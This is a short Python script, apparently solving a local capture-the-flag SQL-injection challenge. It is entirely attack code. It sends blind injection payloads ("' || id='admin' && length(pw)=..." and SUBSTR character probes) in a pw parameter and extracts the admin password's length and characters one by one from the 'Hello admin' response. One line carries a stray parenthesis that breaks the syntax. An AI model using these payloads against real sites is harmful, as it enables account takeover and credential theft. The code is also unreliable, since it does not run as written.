import requests
import urllib.parse
import string

hello_admin = "Hello admin"
length_pass = 0

for x in range(1, 21): 
    url = "http://localhost/sqli_challenge/index.php?pw=" + urllib.parse.quote("' || id='admin' && length(pw)={}#".format(x))
    print(url)  
    res = requests.get(url)
    if hello_admin in res.text:
        print("Password Length is " + str(x))
        length_pass = x
        break

print("Password Length: ", length_pass)

pwd = ''


for i in range(1, length_pass + 1):
    for j in range(48, 123): 
        if (j < 58) or (j > 96):)
          
            url = "http://localhost/sqli_challenge/index.php?pw=" + urllib.parse.quote("' || id='admin' && SUBSTR(pw, {}, 1)='{}' -- ".format(i, chr(j)))
            print(url)  
            req = requests.get(url) 

            if hello_admin in req.text: 
                print(f"Found character: {chr(j)} at position {i}")
                pwd += chr(j)  
  

print("Password: ", pwd) 
